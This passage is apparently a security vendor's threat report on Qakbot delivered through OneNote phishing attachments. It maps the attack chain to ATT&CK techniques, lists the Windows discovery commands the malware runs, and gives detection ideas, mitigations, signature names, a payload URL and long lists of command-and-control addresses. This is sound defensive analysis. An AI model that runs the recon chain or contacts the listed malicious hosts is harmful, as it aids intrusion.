+<p>ATT&amp;CK Technique (Technique ID)</p>
+
+<p>Threat Actions/Behaviors</p>
+
+<p>Initial Access</p>
+
+<ul>
+  <li>Phishing: Spearphishing Attachment (T1566.001)</li>
+</ul>
+
+<p>Threat actor lured user to open malicious email with malicious OneNote
+file as attachment (.one file extension).</p>
+
+<p>Execution</p>
+
+<ul>
+  <li>User Execution: Malicious File (T1204.002)</li>
+</ul>
+
+<p>User opened malicious OneNote file attachment.</p>
+
+<p>Execution</p>
+
+<ul>
+  <li>User Execution: Malicious Link (T1204.001)</li>
+</ul>
+
+<p>User clicks on malicious link included in the OneNote file</p>
+
+<p>Defense Evasion</p>
+
+<ul>
+  <li>System Binary Proxy Execution: MSHTA (T1218.005)</li>
+</ul>
+
+<p>OneNote spawns MSHTA to execute embedded .HTA file. </p>
+
+<p>Command And Control</p>
+
+<ul>
+  <li>Ingress Tool Transfer (T1105)</li>
+</ul>
+
+<p>MSHTA spawns cURL to download 2nd stage payload. </p>
+
+<p>Defense Evasion</p>
+
+<ul>
+  <li>System Binary Proxy Execution: RunDll32 (T1218.011)</li>
+</ul>
+
+<p>It spawns RunDll32 to execute 2nd stage payload. </p>
+
+<p>Defense Evasion</p>
+
+<ul>
+  <li>Process Injection: Process Hollowing (T1055.012)</li>
+</ul>
+
+<p>RunDll32 (Qbot) spawns and injects into a Windows System Process (e.g.,
+wermgr.exe).</p>
+
+<p>Discovery</p>
+
+<ul>
+  <li>
+    <p>System Information Discovery (T1082)</p>
+  </li>
+  <li>
+    <p>Security Software Discovery (T1518.001)</p>
+  </li>
+  <li>
+    <p>Windows Management Instrumentation (T1047)</p>
+  </li>
+</ul>
+
+<p>Injected Windows System Process (e.g., wermgr.exe) executes discovery
+commands via WMI.</p>
+
+<p>Discovery</p>
+
+<ul>
+  <li>
+    <p>System Information Discovery (T1082)</p>
+  </li>
+  <li>
+    <p>System Owner/User Discovery (T1033)</p>
+  </li>
+  <li>
+    <p>Domain Trust Discovery (T1482)</p>
+  </li>
+  <li>
+    <p>System Network Connections Discovery (T1049)</p>
+  </li>
+  <li>
+    <p>Windows Command Shell (T1059.003)</p>
+  </li>
+</ul>
+
+<p>Injected Windows System Process (e.g., wermgr.exe) executes discovery
+commands via CMD.<br />
+|_ net view<br />
+|_ cmd /c set<br />
+|_ arp -a<br />
+|_ ipconfig /all<br />
+|_ nslookup -querytype=ALL -timeout=12
+_ldap._tcp.dc._msdcs.{DOMAIN}<br />
+|_ nltest /domain_trusts /all_trusts<br />
+|_ net share<br />
+|_ route print<br />
+|_ netstat -nao<br />
+|_ net localgroup<br />
+|_ qwinsta<br />
+|_ whoami /all</p>
+
+<p>Persistence</p>
+
+<ul>
+  <li>Scheduled Tasks (T1053)</li>
+</ul>
+
+<p>Windows System Process (e.g., wermgr.exe) stablishes persistence via
+scheduled tasks.</p>
+
+<p>Persistence</p>
+
+<ul>
+  <li>Boot or Logon Autostart Execution: Registry Run Keys / Startup
+Folder (T1547.001)</li>
+</ul>
+
+<p>Windows System Process (e.g., wermgr.exe) stablishes persistence via
+autorun registry keys.</p>
+
+<p>Detection Opportunities</p>
+
+<p>This is a mapping of Detection Opportunities to Threat Behaviours,
+Analysis Methods (<a href="https://d3fend.mitre.org/">[D3FEND]</a> )
+and [ATT&amp;CK]techniques.</p>
+
+<p>Defense Goal</p>
+
+<p>Threat Actions vs Detection Opportunities</p>
+
+<p>Analysis Methods</p>
+
+<p>ATT&amp;CK Technique (Technique ID)</p>
+
+<p>Detect Suspicious Process Execution (Genealogy) </p>
+
+<ul>
+  <li>
+    <p>Outlook spawns MSHTA/CMD</p>
+  </li>
+  <li>
+    <p>MSHTA spawns cURL</p>
+  </li>
+  <li>
+    <p>MSHTA/CMD spawns RunDll23</p>
+  </li>
+  <li>
+    <p>RunDll32 spawns Windows System Binary</p>
+  </li>
+  <li>
+    <p>Windows System Binary spawns cmd.exe</p>
+  </li>
+  <li>
+    <p>Windows System Binary spawns schtasks.exe</p>
+  </li>
+</ul>
+
+<pre><code class="language-{=html}">&lt;!-- --&gt;
+</code></pre>
+<ul>
+  <li>Process Spawn Analysis</li>
+</ul>
+
+<pre><code class="language-{=html}">&lt;!-- --&gt;
+</code></pre>
+<ul>
+  <li>
+    <p>User Execution: Malicious File (T1204.002)</p>
+  </li>
+  <li>
+    <p>System Binary Proxy Execution: MSHTA (T1218.005)</p>
+  </li>
+  <li>
+    <p>System Binary Proxy Execution: RunDll32 (T1218.011)</p>
+  </li>
+  <li>
+    <p>Windows Command Shell (T1059.003)</p>
+  </li>
+  <li>
+    <p>Scheduled Tasks (T1053)</p>
+  </li>
+</ul>
+
+<p>Detect Suspicious Process Injection Attempts</p>
+
+<ul>
+  <li>RunDll32 injects Windows System Binary</li>
+</ul>
+
+<pre><code class="language-{=html}">&lt;!-- --&gt;
+</code></pre>
+<ul>
+  <li>
+    <p>Process Spawn Analysis</p>
+  </li>
+  <li>
+    <p>System Call Analysis</p>
+  </li>
+</ul>
+
+<pre><code class="language-{=html}">&lt;!-- --&gt;
+</code></pre>
+<ul>
+  <li>Ingress Tool Transfer (T1105)</li>
+</ul>
+
+<p>Detect Suspicious Network Connection Attempts<br />
+(Network Connection Events) </p>
+
+<ul>
+  <li>Windows System Binary connects to public IP</li>
+</ul>
+
+<pre><code class="language-{=html}">&lt;!-- --&gt;
+</code></pre>
+<ul>
+  <li>Connection Attempt Analysis</li>
+</ul>
+
+<pre><code class="language-{=html}">&lt;!-- --&gt;
+</code></pre>
+<ul>
+  <li>
+    <p>Ingress Tool Transfer (T1105)</p>
+  </li>
+  <li>
+    <p>Application Layer Protocol: Web Protocols (T1071.001)</p>
+  </li>
+</ul>
+
+<p>Detect Suspicious Sequence of Commands <br />
+(Process Created Events) </p>
+
+<ul>
+  <li>Windows System Binary spawns sequence of discovery commands</li>
+</ul>
+
+<pre><code class="language-{=html}">&lt;!-- --&gt;
+</code></pre>
+<ul>
+  <li>Command Execution Analysis</li>
+</ul>
+
+<pre><code class="language-{=html}">&lt;!-- --&gt;
+</code></pre>
+<ul>
+  <li>
+    <p>System Information Discovery (T1082)</p>
+  </li>
+  <li>
+    <p>Domain Trust Discovery (T1482)</p>
+  </li>
+  <li>
+    <p>System Network Connections Discovery (T1049)</p>
+  </li>
+  <li>
+    <p>Windows Command Shell (T1059.003)</p>
+  </li>
+</ul>
+
+<p>Note: In this analysis, the references to Outlook, OneNote, MSHTA,
+RunDll32, Cmd, schtask, wermgr refer to legit system binaries running
+from their expected paths.</p>
+
+<p>Prevention and Mitigation</p>
+
+<p>On top of CISA’s
+counter-phishing <a href="https://www.cisa.gov/sites/default/files/publications/Capacity_Enhancement_Guide-Counter-Phishing_Recommendations_for_Federal_Agencies.pdf">[recommendations]</a>,
+we recommend the following prevention and mitigation countermeasures
+against this campaign:</p>
+
+<ol>
+  <li>
+    <p>Block emails with attachments with uncommon file extensions (.one,
+.hta, .vbs, .js, .wsf, .iso, .vhd, .img) [SECURE EMAIL GATEWAY
+CAPABILITIES]</p>
+  </li>
+  <li>
+    <p>Block known malicious sites [OUTBOUND WEB-BROWSING PROTECTIONS]</p>
+  </li>
+  <li>
+    <p>Block rarely used top-level domains [OUTBOUND WEB-BROWSING
+PROTECTIONS]</p>
+  </li>
+  <li>
+    <p>Block network connections initiated by commonly abused system
+binaries (e.g., MSHTA.exe, RunDll32.exe, cmd.exe) [OUTBOUND
+WEB-BROWSING PROTECTIONS]</p>
+  </li>
+  <li>
+    <p>Change default file associations for script file formats that are
+uncommon in your environment (e.g,: .wsf, .js, .hta, .vba, .chm,
+.cmd) [ENDPOINT PROTECTIONS]</p>
+  </li>
+  <li>
+    <p>Block PE File Creation on paths commonly used by malware (e.g,:
+%PROGRAMDATA%) [ENDPOINT PROTECTIONS]</p>
+  </li>
+</ol>
+
+<p>Threat intelligence</p>
+
+<p>Recent Qakbot OneNote variant leverages the trick of using U+202E in
+attached filename. It involves the use of the Right-to-Left Override
+character which is used to flip the direction of text from left-to-right
+to right-to-left. The attached filename that appears to be legitimate
+but is actually malicious. For example, a file named "tempeno.hta"
+could be renamed to "tempath.one" by using this technique, which could
+potentially trick users into opening the file, believing it to be a
+OneNote document (Figure 13).</p>
+
+<p><img src="/assets/img/arch/Qakbot.assets/image13.jpeg" alt="Figure 13 U+202E trick in attached file
+name." />Figure
+13 U+202E trick in attached file name.</p>
+
+<p><a href="https://blog.sevagas.com/?RedTeam-With-OneNote">[Sevagas]</a> introduced
+the usage of OneNote in red teaming for the first time in August 2022.
+Thereafter, the distribution of malware via Microsoft OneNote documents
+in email is on the rise, with various cybercriminal threat actors
+utilizing this method. Most of these campaigns are broadly targeted,
+with a high volume of email phishing sent out. These attacks have
+impacted organizations globally, including those in North America and
+Europe, with TA577 returning from a break in activity and using OneNote
+to deliver Qakbot at the end of
+January <a href="https://www.proofpoint.com/us/blog/threat-insight/onenote-documents-increasingly-used-to-deliver-malware">[2023]</a> .
+To gain a deeper understanding of the distribution of malware via
+Microsoft OneNote documents, we conducted a comprehensive analysis of
+our telemetry data (see Figure 14). Monitoring phishing emails with
+attachments or links leading to OneNote papers was our initial step. We
+further extracted all payloads from the OneNote documents and examined
+their techniques for capturing remote malicious payloads and
+understanding their threat vectors. By investigating these insights, we
+aimed to gain a more in-depth understanding of the threats posed by
+malware distributed via OneNote documents.</p>
+
+<p><img src="/assets/img/arch/Qakbot.assets/image14.jpeg" alt="Figure 14 Workflow of malware payloads extraction from OneNote malware
+distribution campaigns." />{width=”6.5in”
+height=”1.5465277777777777in”}Figure 14 Workflow of malware payloads
+extraction from OneNote malware distribution campaigns. </p>
+
+<p>Malicious OneNote documents have been a growing concern in recent
+months. One of the first malicious campaigns that used OneNote document
+was PoC scripts that included PE binary (KrbRelayUp) inside the document
+(1dc133f24649611277716350f9d63ccd7c30cec27b9b4b7c62f6bbfe395acfac) since
+June 2022, or embedded HTA that downloads remote PowerShell scripts to
+install PoshC2 in mid-November 2022
+(1ff8e47def1e557b14470f95215d8763876f28411d4cf4fc7319c077733acd63).</p>
+
+<p>Malicious OneNote documents have been a growing concern in recent
+months. One of the first malicious campaigns that used OneNote document
+was PoC scripts that included PE binary (KrbRelayUp) inside the document
+(1dc133f24649611277716350f9d63ccd7c30cec27b9b4b7c62f6bbfe395acfac) since
+June 2022, or embedded HTA that downloads remote PowerShell scripts to
+install PoshC2 in mid-November 2022
+(1ff8e47def1e557b14470f95215d8763876f28411d4cf4fc7319c077733acd63). <img src="/assets/img/arch/Qakbot.assets/image15.jpeg" alt="Figure
+15 Phishing OneNote document since November 2022 targeted
+NedBank" />Figure
+15 Phishing OneNote document since November 2022 targeted NedBank</p>
+
+<p>However, the number of malicious OneNote samples has been gradually
+increasing since December 2022-January 2023, by counting the files
+collected up to February 16, 2023 (Figure 16). Additionally, a portion
+of the benign OneNote samples are decoy files samples that are
+downloaded by users upon executing the malicious OneNote files.
+Furthermore, the number of benign OneNote samples that are used as decoy
+files downloaded by users upon executing the malicious files are
+increasing as well. This trend shows that the ratio of malicious OneNote
+samples is heavily increasing.</p>
+
+<p><img src="/assets/img/arch/Qakbot.assets/image16.jpeg" alt="Figure 16 Malicious OneNote detection since
+01/2023." />{width=”6.5in”
+height=”3.5006944444444446in”}Figure 16 Malicious OneNote detection
+since 01/2023.</p>
+
+<p>Figure 17 illustrates a chart of malicious OneNote detections in 2023.
+These outbreaks have been reported in various countries, including the
+United States, South Korea, and Germany, and have impacted a wide range
+of industries. </p>
+
+<p><img src="/assets/img/arch/Qakbot.assets/image17.jpeg" alt="Figure 17 Detected malicious OneNote events in 2023 across
+countries." />{width=”6.5in”
+height=”3.459722222222222in”}Figure 17 Detected malicious OneNote events
+in 2023 across countries.</p>
+
+<p>To gain deeper insights into the statistics of detection across
+industries, we analyzed the infected indicators of compromise. The
+results (Figure 18) indicate that the manufacturing, high-tech, and
+telecom sectors have the highest number of infected IoCs. This suggests
+that these industries may be more vulnerable to these types of attacks
+and need to take proactive measures to protect their systems and
+networks from potential threats.</p>
+
+<p><img src="/assets/img/arch/Qakbot.assets/image18.jpeg" alt="Figure 18 Detected OneNote events in 2023 across
+industries." />{width=”6.5in”
+height=”4.497222222222222in”}Figure 18 Detected OneNote events in 2023
+across industries.</p>
+
+<p>In addition, various threat actors have started to use OneNote documents
+to distribute malware. In December 2002, we detected campaigns that used
+PowerShell in OneNote document to download the remote AsyncRAT payload.
+Since the end of January 2023, there has been an upsurge in the number
+of Qakbot campaigns using OneNote documents for malware distribution.
+Recently, we detected Onenote document started to drop Icedid malware
+using the same tactic. We have been tracking down some of the campaigns
+as listed below:</p>
+
+<p>Version</p>
+
+<p>Campaign</p>
+
+<p>Timestamp</p>
+
+<p>Converted timestamp</p>
+
+<p>404.432</p>
+
+<p>obama235</p>
+
+<p>1675240891</p>
+
+<p>February 1, 2023</p>
+
+<p>404.432</p>
+
+<p>bb12</p>
+
+<p>1675417198</p>
+
+<p>February 3, 2023</p>
+
+<p>404.506</p>
+
+<p>bb15</p>
+
+<p>1676367197</p>
+
+<p>February 14, 2023</p>
+
+<p>404.510</p>
+
+<p>tok01</p>
+
+<p>1676453967</p>
+
+<p>February 15, 2023</p>
+
+<p>Table 5 Various campaigns of Qakbot using OneNote documents for malware
+distribution.</p>
+
+<p>Version/Campaign</p>
+
+<p>C2</p>
+
+<p>0.5.7B</p>
+
+<p>207.244.236.205:6606<br />
+207.244.236.205:7707<br />
+207.244.236.205:8808</p>
+
+<p>3LOSH RAT</p>
+
+<p>xxxprofxxx.dnsdojo.com:5126<br />
+xxxsthebagsxxx.mywire.org:6606<br />
+xxxsthebagsxxx.mywire.org:7707<br />
+xxxsthebagsxxx.mywire.org:8808</p>
+
+<p>0.5.7B</p>
+
+<p>209.126.83.213:6606<br />
+209.126.83.213:7707<br />
+209.126.83.213:8808</p>
+
+<p>Table 6 Various campaigns of AsyncRAT using OneNote documents for
+malware distribution.</p>
+
+<p>Version/Campaign</p>
+
+<p>C2</p>
+
+<p>3954321778</p>
+
+<p>ehonlionetodo.com</p>
+
+<p>Table 7 Icedid malware using OneNote documents for malware distribution</p>
+
+<p>C2</p>
+
+<p>su1d.nerdpol.ovh:7000</p>
+
+<p>Table 8 Xworm malware using OneNote documents for malware distribution</p>
+
+<p>Conclusion</p>
+
+<p>This research presents an analysis of a new spreading vector of the
+Qakbot malware. It consists of detailed analyses of OneNote malicious
+document, loader Qakbot DLL and its main payload. We show how we
+deobfuscated and unpacked Qakbot and extracted their configurations.</p>
+
+<p>Even though these Qakbot campaigns do not seem to target a specific
+industry or territory, we have seen a considerable number of infections
+in the United States, India, Turkey, and Thailand. Based on our
+investigation, we believe that this tactic will continue to raise in
+other campaigns. Threat actors will make attempts to bypass detection
+from security solutions by exploring other evasion techniques such as
+embedding other malicious Office types inside OneNote, or other classic
+executable file tactics: Java, Python, SCR, MSI, etc. We recommend
+organizations and users to follow our proposed prevention and mitigation
+countermeasures against this campaign. </p>
+
+<p>Appendix</p>
+
+<p>Trellix malicious OneNote campaigns and Qakbot detection signatures</p>
+
+<p>Product</p>
+
+<p>Signature</p>
+
+<p>Endpoint Security (ENS)</p>
+
+<p>One/Downloader.a.<br />
+W32/PinkSbot-IH<br />
+W32/PinkSbot-HZ<br />
+W32/PinkSbot-IB </p>
+
+<p>Endpoint Security (HX)</p>
+
+<p>WERMGR LAUNCHED WITHOUT COMMAND LINE ARGUMENTS (METHODOLOGY)<br />
+POWERSHELL DOWNLOAD AT SUSPICIOUS PATH (METHODOLOGY)<br />
+QAKBOT J (FAMILY) </p>
+
+<p>Network Security(NX)<br />
+Detection as a Service<br />
+Email Security<br />
+Malware Analysis<br />
+File Protect </p>
+
+<p>FE_Trojan_ONE_Generic_1<br />
+FE_Trojan_ONE_Generic_2<br />
+FE_Trojan_ONE_Generic_3<br />
+FE_Trojan_ONE_Generic_4<br />
+FE_Trojan_ONE_Generic_5<br />
+FE_Trojan_ONE_Generic_6<br />
+FEC_Downloader_CMD_Generic_1<br />
+FEC_Downloader_CMD_Generic_2<br />
+FEC_Trojan_HTML_Generic_48<br />
+FEC_Trojan_HTML_Generic_49<br />
+FE_Trojan_Win32_QAKBOT_2<br />
+Downloader.CMD.Generic.MVX<br />
+Suspicious EmbeddedObject Onenote Activity<br />
+Suspicious Process Rundll32 Activity<br />
+Policy File ONENOTE with Embeded Object Delivered thru Emails<br />
+Suspicious Network By Powershell </p>
+
+<p>Helix</p>
+
+<p>WINDOWS METHODOLOGY [Office Suspicious Child Process] (1.1.2497)<br />
+WINDOWS METHODOLOGY [Rundll32 Abuse] (1.1.3992) </p>
+
+<p>IoCs</p>
+
+<p>The latest Qakbot hashes can be found in Trellix Insights under the
+various Qbot Campaigns.</p>
+
+<p>DLL payload URLs<br />
+URL</p>
+
+<p>http://185.104.195.9/87084.dat </p>
+
+<p>Registries<br />
+URL</p>
+
+<p>HKEY_CURRENT_USER\Software\Microsoft\[RANDOM] </p>
+
+<p>Qakbot C2 IP:port (timestamp 1676453967 February 15, 2023)</p>
+
+<p>75.143.236.149:443</p>
+
+<p>47.34.30.133:443</p>
+
+<p>103.212.19.254:995</p>
+
+<p>85.61.165.153:2222</p>
+
+<p>12.172.173.82:995</p>
+
+<p>217.165.186.116:2222</p>
+
+<p>103.231.216.238:443</p>
+
+<p>156.216.125.255:995</p>
+
+<p>86.96.72.139:2222</p>
+
+<p>181.118.206.65:995</p>
+
+<p>24.239.69.244:443</p>
+
+<p>188.83.248.76:443</p>
+
+<p>183.87.163.165:443</p>
+
+<p>68.108.122.180:443</p>
+
+<p>64.237.185.60:443</p>
+
+<p>98.145.23.67:443</p>
+
+<p>173.18.126.3:443</p>
+
+<p>2.50.48.213:443</p>
+
+<p>150.107.231.59:2222</p>
+
+<p>45.50.233.214:443</p>
+
+<p>77.86.98.236:443</p>
+
+<p>122.184.143.82:443</p>
+
+<p>24.71.120.191:443</p>
+
+<p>103.141.50.102:995</p>
+
+<p>82.127.204.82:2222</p>
+
+<p>73.165.119.20:443</p>
+
+<p>217.128.91.196:2222</p>
+
+<p>136.244.25.165:443</p>
+
+<p>41.230.174.134:443</p>
+
+<p>2.13.73.146:2222</p>
+
+<p>50.68.204.71:443</p>
+
+<p>90.104.22.28:2222</p>
+
+<p>46.27.231.50:2078</p>
+
+<p>162.248.14.107:443</p>
+
+<p>74.33.196.114:443</p>
+
+<p>27.109.19.90:2078</p>
+
+<p>114.79.180.14:995</p>
+
+<p>121.121.100.207:995</p>
+
+<p>86.207.227.152:2222</p>
+
+<p>75.98.154.19:443</p>
+
+<p>81.157.227.223:2222</p>
+
+<p>104.35.24.154:443</p>
+
+<p>86.130.9.232:2222</p>
+
+<p>62.35.67.88:443</p>
+
+<p>201.244.108.183:995</p>
+
+<p>124.122.56.144:443</p>
+
+<p>151.65.224.211:443</p>
+
+<p>190.75.132.158:2222</p>
+
+<p>85.241.180.94:443</p>
+
+<p>12.172.173.82:20</p>
+
+<p>184.176.35.223:2222</p>
+
+<p>2.99.47.198:2222</p>
+
+<p>67.187.130.101:443</p>
+
+<p>190.11.198.75:443</p>
+
+<p>109.150.179.236:2222</p>
+
+<p>172.248.42.122:443</p>
+
+<p>98.37.25.99:443</p>
+
+<p>73.29.92.128:443</p>
+
+<p>85.85.34.201:993</p>
+
+<p>82.212.115.188:443</p>
+
+<p>202.142.98.62:443</p>
+
+<p>93.156.99.48:443</p>
+
+<p>205.164.227.222:443</p>
+
+<p>190.206.75.58:2222</p>
+
+<p>47.149.78.242:443</p>
+
+<p>88.126.94.4:50000</p>
+
+<p>12.172.173.82:50001</p>
+
+<p>161.142.107.68:995</p>
+
+<p>86.250.12.217:2222</p>
+
+<p>35.143.97.145:995</p>
+
+<p>47.21.51.138:443</p>
+
+<p>188.49.125.169:995</p>
+
+<p>174.104.184.149:443</p>
+
+<p>58.247.115.126:995</p>
+
+<p>86.202.48.142:2222</p>
+
+<p>12.172.173.82:995</p>
+
+<p>125.99.69.178:443</p>
+
+<p>103.252.7.231:443</p>
+
+<p>76.170.252.153:995</p>
+
+<p>116.75.63.211:443</p>
+
+<p>86.225.214.138:2222</p>
+
+<p>73.161.176.218:443</p>
+
+<p>109.49.52.108:2222</p>
+
+<p>87.202.101.164:50000</p>
+
+<p>65.190.242.244:443</p>
+
+<p>92.97.197.177:2222</p>
+
+<p>86.195.14.72:2222</p>
+
+<p>24.206.27.39:443</p>
+
+<p>149.74.159.67:2222</p>
+
+<p>84.215.202.22:443</p>
+
+<p>116.72.250.18:443</p>
+
+<p>202.142.98.62:995</p>
+
+<p>95.255.60.223:995</p>
+
+<p>12.172.173.82:2087</p>
+
+<p>103.42.86.110:995</p>
+
+<p>74.92.243.113:50000</p>
+
+<p>176.142.207.63:443</p>
+
+<p>103.123.223.76:443</p>
+
+<p>90.213.146.227:443</p>
+
+<p>87.221.197.113:2222</p>
+
+<p>27.0.48.233:443</p>
+
+<p>103.144.201.53:2078</p>
+
+<p>89.129.109.27:2222</p>
+
+<p>92.27.86.48:2222</p>
+
+<p>27.0.48.205:443</p>
+
+<p>84.35.26.14:995</p>
+
+<p>213.67.255.57:2222</p>
+
+<p>88.126.112.14:50000</p>
+
+<p>12.172.173.82:465</p>
+
+<p>31.53.29.145:2222</p>
+
+<p>209.142.97.83:995</p>
+
+<p>50.68.204.71:993</p>
+
+<p>59.28.84.65:443</p>
+
+<p>108.2.111.66:995</p>
+
+<p>12.172.173.82:21</p>
+
+<p>136.232.184.134:995</p>
+
+<p>114.143.176.234:443</p>
+
+<p>12.172.173.82:990</p>
+
+<p>85.59.61.52:2222</p>
+
+<p>24.228.132.224:2222</p>
+
+<p>Office 365 themed phishing campaign distributes Qakbot malware since
+February 22nd 2023.</p>
+
+<p><img src="/assets/img/arch/Qakbot.assets/image19.jpeg" alt="Figure 19 Attack vector of Office365 themed phishing in PDF
+attachment." />{width=”6.5in”
+height=”5.608333333333333in”}Figure 19 Attack vector of Office365 themed
+phishing in PDF attachment.</p>
+
+<p>Version</p>
+
+<p>Campaign</p>
+
+<p>Timestamp</p>
+
+<p>Converted timestamp</p>
+
+<p>404.9</p>
+
+<p>BB16</p>
+
+<p>1677046917</p>
+
+<p>February 22, 2023</p>
+
+<p>Qakbot C2 IP:port (timestamp 1677046917 February 22, 2023)</p>
+
+<p>47.21.51.138:443 </p>
+
+<p>76.80.180.154:995</p>
+
+<p>12.172.173.82:995</p>
+
+<p>72.80.7.6:50003</p>
+
+<p>12.172.173.82:32101</p>
+
+<p>70.77.116.233:443</p>
+
+<p>82.127.204.82:2222</p>
+
+<p>68.150.18.161:443</p>
+
+<p>162.248.14.107:443</p>
+
+<p>49.175.72.56:443</p>
+
+<p>68.173.170.110:8443</p>
+
+<p>75.98.154.19:443</p>
+
+<p>201.244.108.183:995</p>
+
+<p>24.9.220.167:443</p>
+
+<p>58.247.115.126:995</p>
+
+<p>122.184.143.82:443</p>
+
+<p>12.172.173.82:2087</p>
+
+<p>184.68.116.146:61202</p>
+
+<p>102.156.253.86:443</p>
+
+<p>50.68.204.71:993</p>
+
+<p>41.99.50.76:443</p>
+
+<p>74.58.71.237:443</p>
+
+<p>107.146.12.26:2222</p>
+
+<p>184.68.116.146:3389</p>
+
+<p>47.21.51.138:995</p>
+
+<p>81.229.117.95:2222</p>
+
+<p>72.203.216.98:2222</p>
+
+<p>77.86.98.236:443</p>
+
+<p>27.0.48.233:443</p>
+
+<p>103.252.7.231:443</p>
+
+<p>71.31.101.183:443</p>
+
+<p>69.133.162.35:443</p>
+
+<p>12.172.173.82:50001</p>
+
+<p>136.232.184.134:995</p>
+
+<p>59.28.84.65:443</p>
+
+<p>70.160.80.210:443</p>
+
+<p>86.225.214.138:2222</p>
+
+<p>76.170.252.153:995</p>
+
+<p>12.172.173.82:465</p>
+
+<p>95.242.101.251:995</p>
+
+<p>89.32.159.192:995</p>
+
+<p>12.172.173.82:21</p>
+
+<p>109.11.175.42:2222</p>
+
+<p>202.142.98.62:995</p>
+
+<p>47.34.30.133:443</p>
+
+<p>90.78.138.217:2222</p>
+
+<p>73.78.215.104:443</p>
+
+<p>202.187.232.161:995</p>
+
+<p>184.176.35.223:2222</p>
+
+<p>181.164.217.211:443</p>
+
+<p>98.147.155.235:443</p>
+
+<p>35.143.97.145:995</p>
+
+<p>92.97.203.51:2222</p>
+
+<p>124.122.56.144:443</p>
+
+<p>202.186.177.88:443</p>
+
+<p>116.74.164.26:443</p>
+
+<p>75.141.227.169:443</p>
+
+<p>114.79.180.14:995</p>
+
+<p>103.141.50.102:995</p>
+
+<p>103.144.201.53:2078</p>
+
+<p>86.150.47.219:443</p>
+
+<p>149.74.159.67:2222</p>
+
+<p>172.248.42.122:443</p>
+
+<p>183.87.163.165:443</p>
+
+<p>116.72.250.18:443</p>
+
+<p>12.172.173.82:990</p>
+
+<p>50.68.186.195:443</p>
+
+<p>125.99.69.178:443</p>
+
+<p>24.239.69.244:443</p>
+
+<p>190.75.95.164:2222</p>
+
+<p>202.142.98.62:443</p>
+
+<p>173.18.126.3:443</p>
+
+<p>98.145.23.67:443</p>
+
+<p>67.61.71.201:443</p>
+
+<p>73.165.119.20:443</p>
+
+<p>67.10.175.47:2222</p>
+
+<p>103.123.223.168:443</p>
+
+<p>90.104.22.28:2222</p>
+
+<p>71.212.147.224:2222</p>
+
+<p>80.13.205.69:2222</p>
+
+<p>14.192.241.76:995</p>
+
+<p>88.126.94.4:50000</p>
+
+<p>80.0.74.165:443</p>
+
+<p>74.33.196.114:443</p>
+
+<p>103.140.174.19:2222</p>
+
+<p>86.99.54.39:2222</p>
+
+<p>74.93.148.97:995</p>
+
+<p>103.231.216.238:443</p>
+
+<p>213.67.255.57:2222</p>
+
+<p>86.202.48.142:2222</p>
+
+<p>78.84.123.237:995</p>
+
+<p>176.142.207.63:443</p>
+
+<p>174.104.184.149:443</p>
+
+<p>180.151.108.14:443</p>
+
+<p>50.67.17.92:443</p>
+
+<p>12.172.173.82:20</p>
+
+<p>80.47.57.131:2222</p>
+
+<p>217.165.1.53:2222</p>
+
+<p>109.151.144.37:443</p>
+
+<p>198.2.51.242:993</p>
+
+<p>70.64.77.115:443</p>
+
+<p>104.35.24.154:443</p>
+
+<p>50.68.204.71:995</p>
+
+<p>2.50.47.74:443</p>
+
+<p>114.143.176.234:443</p>
+
+<p>205.164.227.222:443</p>
+
+<p>66.191.69.18:995</p>
+
+<p>84.35.26.14:995</p>
+
+<p>147.219.4.194:443</p>
+
+<p>75.143.236.149:443</p>
+
+<p>45.50.233.214:443</p>
+
+<p>77.124.6.149:443</p>
+
+<p>197.92.136.122:443</p>
+
+<p>64.237.185.60:443</p>
+
+<p>49.245.82.178:2222</p>
+
+<p>108.190.203.42:995</p>
+
+<p>73.161.176.218:443</p>
+
+<p>46.10.198.107:443</p>
+
+<p>50.68.204.71:443</p>
+
+<p><em>This document and the information contained herein describes computer
+security research for educational purposes only and the convenience of
+Trellix customers. Any attempt to recreate part or all of the activities
+described is solely at the user’s risk, and neither Trellix nor its
+affiliates will bear any responsibility or liability.</em></p>
+
+  </article>
+
+</div>
+
+    </div>
+
+    <!-- Footer -->
+
+    
+<footer class="fixed-bottom">
+  <div class="container mt-0">
+    &copy; Copyright 2025 Duy Phuc  Pham.
+    Powered by <a href="http://jekyllrb.com/" target="_blank">Jekyll</a> with <a href="https://github.com/alshedivat/al-folio">al-folio</a> theme. Hosted by <a href="https://pages.github.com/" target="_blank">GitHub Pages</a>. Photos from <a href="https://unsplash.com" target="_blank">Unsplash</a>.
+
+    
+  </div>
+</footer>
+
+
+
+  </body>
+
+  <!-- jQuery -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js" integrity="sha512-bLT0Qm9VnAYZDflyKcBaQ2gg0hSYNQrJ8RilYldYQ1FxQYoCLtUjuuRuZo+fjqhx/qtq/1itJ0C2ejDxltZVFg==" crossorigin="anonymous"></script>
+
+  <!-- Bootsrap & MDB scripts -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/2.4.4/umd/popper.min.js" integrity="sha512-eUQ9hGdLjBjY3F41CScH3UX+4JDSI9zXeroz7hJ+RteoCaY+GP/LDoM8AO+Pt+DRFw3nXqsjh9Zsts8hnYv8/A==" crossorigin="anonymous"></script>
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js" integrity="sha512-M5KW3ztuIICmVIhjSqXe01oV2bpe248gOxqmlcYrEzAvws7Pw3z6BK0iGbrwvdrUQUhi3eXgtxp5I8PDo9YfjQ==" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mdbootstrap/4.19.1/js/mdb.min.js" integrity="sha512-Mug9KHKmroQFMLm93zGrjhibM2z2Obg9l6qFG2qKjXEXkMp/VDkI4uju9m4QKPjWSwQ6O2qzZEnJDEeCw0Blcw==" crossorigin="anonymous"></script>
+
+  
+<!-- Mansory & imagesLoaded -->
+<script defer src="https://unpkg.com/masonry-layout@4/dist/masonry.pkgd.min.js"></script>
+<script defer src="https://unpkg.com/imagesloaded@4/imagesloaded.pkgd.min.js"></script>
+<script defer src="/assets/js/mansory.js" type="text/javascript"></script>
+
+
+  
+<!-- Enable Tooltips -->
+<script type="text/javascript">
+$(function () {$('[data-toggle="tooltip"]').tooltip()})
+</script>
+
+
+
+<!-- Load Common JS -->
+<script src="/assets/js/common.js"></script>
+
+<!-- Load DarkMode JS -->
+<script src="/assets/js/dark_mode.js"></script>
+
+
+</html>
